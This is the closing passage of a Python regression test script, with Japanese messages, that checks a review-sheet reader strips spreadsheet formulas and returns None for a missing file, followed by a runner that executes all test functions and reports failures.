        fp = os.path.join(d, 'review.xlsx')
        with open(fp, 'wb') as fh:
            fh.write(b.getvalue())
        got = app._read_review_sheet(fp)
        wb4 = openpyxl.load_workbook(io.BytesIO(got))
        chk(got and not any(c.data_type == 'f' for row in wb4.active.iter_rows() for c in row),
            'D2: 確認箇所シートを読んで配る道（_read_review_sheet）で数式を文字に戻していない')
        chk(app._read_review_sheet(os.path.join(d, 'none.xlsx')) is None, 'D2: 無いシートを読んだときに None を返さない')
    finally:
        import shutil
        shutil.rmtree(d, ignore_errors=True)


if __name__ == '__main__':
    sys.stdout.reconfigure(encoding='utf-8')
    for name, fn in sorted(globals().items()):
        if name.startswith('test_') and callable(fn):
            try:
                fn()
            except Exception as e:  # noqa: BLE001
                import traceback
                traceback.print_exc()
                FAILS.append(f'{name}: 例外 {type(e).__name__}: {e}')
    for f_ in FAILS:
        print('*** FAILED:', f_)
    print('reg_hunt3:', 'all ok' if not FAILS else f'{len(FAILS)} 件が不合格')
    sys.exit(1 if FAILS else 0)
